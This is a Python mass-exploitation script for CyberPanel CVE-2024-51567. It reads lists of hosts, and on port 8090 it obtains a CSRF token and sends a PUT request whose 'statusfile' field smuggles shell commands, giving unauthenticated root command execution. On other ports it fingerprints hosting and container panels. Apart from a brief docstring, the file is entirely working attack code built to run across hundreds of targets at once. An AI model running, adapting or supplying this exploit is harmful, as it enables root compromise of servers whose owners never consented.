#!/usr/bin/env python3
"""CyberPanel CVE-2024-51567 unauth RCE (root) + hosting-panel fingerprint.

Reads "ip:port" lines. For 8090 -> full exploit chain. Others -> product FP.
Proof-only reporting.
"""
import sys, re, json, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
urllib3.disable_warnings()

T = 10
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36"}

def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(UA)
    return s

# ---------- CyberPanel CVE-2024-51567 ----------
def cyberpanel(host):
    ip = host.rsplit(":", 1)[0]
    for scheme in ("https", "http"):
        base = f"{scheme}://{host}"
        try:
            s = sess()
            r = s.get(base + "/", timeout=T, allow_redirects=False)
        except Exception:
            continue
        txt = (r.text or "")[:6000].lower()
        if "cyberpanel" not in txt and "csrftoken" not in str(r.headers).lower():
            continue
        out = {"host": host, "product": "cyberpanel", "scheme": scheme}
        tok = None
        m = re.search(r"csrftoken=([A-Za-z0-9]+)", str(r.headers))
        if m:
            tok = m.group(1)
        if not tok:
            # try a fresh GET and read cookie from session
            try:
                s.get(base + "/login/", timeout=T)
                tok = s.cookies.get("csrftoken")
            except Exception:
                pass
        if not tok:
            out["note"] = "no csrftoken"
            return out
        # exploit: PUT bypasses secMiddleware
        payload = {"statusfile": "/dev/null; id; hostname; cat /etc/hostname 2>/dev/null; #",
                   "csrftoken": tok}
        hdr = {"X-CSRFToken": tok, "Content-Type": "application/json",
               "Referer": base + "/"}
        try:
            e = s.put(base + "/dataBases/upgrademysqlstatus", json=payload,
                      headers=hdr, timeout=T, allow_redirects=False)
        except Exception as ex:
            out["note"] = f"put failed {type(ex).__name__}"
            return out
        body = e.text or ""
        if "uid=" in body:
            mm = re.search(r"uid=\d+\([a-z]+\)[^\"\\]{0,60}", body)
            out["proof"] = "CVE-2024-51567 ROOT RCE"
            out["evidence"] = mm.group(0) if mm else body[:200]
            out["status"] = e.status_code
            return out
        out["status"] = e.status_code
        out["note"] = body[:120].replace("\n", " ")
        return out
    return None

# ---------- generic hosting panel FP ----------
PANEL_SIGS = [
    ("cyberpanel", "8090"), ("cwp", "2030"), ("cwp", "2031"),
    ("aapanel", "8888"), ("cloudpanel", "8443"), ("hestia", "8083"),
    ("coolify", "8000"), ("portainer", "9000"), ("portainer", "9443"),
]
def generic(host):
    port = host.rsplit(":", 1)[-1]
    for scheme in ("https", "http"):
        try:
            r = requests.get(f"{scheme}://{host}/", timeout=T, verify=False,
                             allow_redirects=True, headers=UA)
        except Exception:
            continue
        t = (r.text or "")[:8000].lower()
        title = ""
        m = re.search(r"<title[^>]*>([^<]{0,60})", r.text or "", re.I)
        if m:
            title = m.group(1).strip()
        prod = None
        if "cyberpanel" in t or "cyber panel" in t: prod = "cyberpanel"
        elif "centOS web panel" in t or "cwp7" in t or "cwp " in title.lower(): prod = "cwp"
        elif "aapanel" in t or "宝塔" in (r.text or ""): prod = "aapanel"
        elif "cloudpanel" in t: prod = "cloudpanel"
        elif "hestiacp" in t or "vesta" in t: prod = "hestia/vesta"
        elif "coolify" in t: prod = "coolify"
        elif "portainer" in t: prod = "portainer"
        elif "proxmox" in t: prod = "proxmox"
        elif "webmin" in t or "miniserv" in str(r.headers).lower(): prod = "webmin"
        if not prod:
            continue
        return {"host": host, "product": prod, "title": title[:60],
                "server": r.headers.get("Server", "")[:40], "scheme": scheme,
                "code": r.status_code}
    return None

def work(h):
    port = h.rsplit(":", 1)[-1]
    if port == "8090":
        return cyberpanel(h)
    return generic(h)

def main():
    path = sys.argv[1]
    hosts = [l.strip() for l in open(path) if l.strip() and not l.startswith("#")]
    print(f"targets={len(hosts)}", flush=True)
    hits, proven, t0 = [], [], time.time()
    lock = threading.Lock()
    out = open("/tmp/vps_panel_hits.jsonl", "w")
    done = 0
    with ThreadPoolExecutor(max_workers=300) as ex:
        futs = {ex.submit(work, h): h for h in hosts}
        for f in as_completed(futs):
            done += 1
            try:
                r = f.result()
            except Exception:
                r = None
            if r:
                with lock:
                    out.write(json.dumps(r) + "\n"); out.flush()
                    hits.append(r)
                if r.get("proof"):
                    with lock:
                        proven.append(r)
                    print(f"  🔥 {json.dumps(r)[:320]}", flush=True)
            if done % 200 == 0:
                print(f"  .. {done}/{len(hosts)} fp={len(hits)} proven={len(proven)} "
                      f"{time.time()-t0:.0f}s", flush=True)
    out.close()
    print(f"\nDONE scanned={done} identified={len(hits)} PROVEN={len(proven)} "
          f"{time.time()-t0:.0f}s", flush=True)
    from collections import Counter
    print("products:", dict(Counter(h["product"] for h in hits)), flush=True)
    json.dump({"scanned": done, "identified": hits, "proven": proven},
              open("/tmp/vps_panel_result.json", "w"), indent=1)

if __name__ == "__main__":
    main()
